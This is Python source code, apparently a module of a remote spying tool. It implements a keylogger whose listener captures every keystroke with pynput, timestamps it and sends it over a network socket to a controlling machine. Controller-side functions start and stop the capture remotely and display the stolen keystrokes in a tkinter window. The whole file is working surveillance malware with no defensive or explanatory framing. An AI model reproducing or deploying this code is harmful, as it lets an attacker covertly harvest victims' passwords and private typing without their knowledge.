from pynput import keyboard
import tkinter as tk
import socket
import threading
import _thread
import time

def key_press(server, threaddic):
      def on_press(key):
            nowtime = time.strftime("%y-%m-%d  %H:%M:%S  :", time.localtime())
            press = ("shot-" + nowtime + str(key)).encode()
            server.send(press)
      listener = keyboard.Listener(on_press = on_press,suppress = False)
      listener.start()
      threaddic["key"] = listener


def thread_key_press(serverlist, threaddic):
      if len(serverlist) > 0 and "key" not in threaddic:
            key_thread = threading.Thread(target = key_press, args = (serverlist[1], threaddic))
            key_thread.start()

def begin_key(clientlist):
      if len(clientlist) > 0 and "shot" not in clientlist:
            clientlist.append("shot")
            clientlist[0].send("shot".encode())

def key_show(data, text_key):
      text_key.insert(tk.END, data + "\n")

def thread_key_show(data, text_key):
      data = data[5:]
      _thread.start_new_thread(key_show, (data, text_key))

def end_key(clientlist):
      if len(clientlist) > 0 and "shot" in clientlist:
            clientlist.remove("shot")
            clientlist[0].send("shotend".encode())

def close_listener(listener):
      listener.stop()
      del listener

def thread_close_listener(threaddic, keys):
      if keys in threaddic:
            _thread.start_new_thread(close_listener, (threaddic[keys],))
            threaddic.pop(keys)
      
